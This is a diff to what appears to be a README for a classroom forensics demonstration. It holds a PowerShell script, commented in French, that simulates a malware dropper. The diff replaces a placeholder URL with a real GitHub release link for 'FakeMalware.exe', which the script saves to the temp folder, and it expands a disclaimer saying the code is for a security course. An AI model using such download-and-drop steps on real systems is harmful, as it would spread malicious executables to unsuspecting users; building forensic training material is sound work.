@@ -41,7 +41,7 @@ if($net.TcpTestSucceeded) { Write-Host " -> Connexion établie." -ForegroundColo
 # 2. TELECHARGEMENT DU PAYLOAD (Dropper)
 # On définit le chemin de destination dans un dossier temporaire (comportement classique)
 $DestPath = "$env:TEMP\FakeMalware.exe"
-$Url = "https://github.com/VOTRE_USER/VOTRE_REPO/raw/main/FakeMalware.exe" # <--- REMPLACEZ CECI
+$Url = "https://github.com/sohukia/forensic-show/releases/download/release/FakeMalware.exe"
 
 Write-Host "[*] Téléchargement du payload depuis GitHub..."
 try {
@@ -81,4 +81,4 @@ Write-Host ">>> ATTAQUE TERMINEE. Vous pouvez commencer l'analyse Forensic." -Fo
 ```
 
 #### Warning
-This is purely a demonstration and for learning content. It is, indeed, used for a presentation in a Computer Science Security Program
+This is purely for demonstration and learning purpose. It is, indeed, used for a presentation in a Computer Science Security Program. The user is aware that the programmer is not responsible for the usage of any kind of this program. It is provided "as is" and should always be reviewed prior to execution.
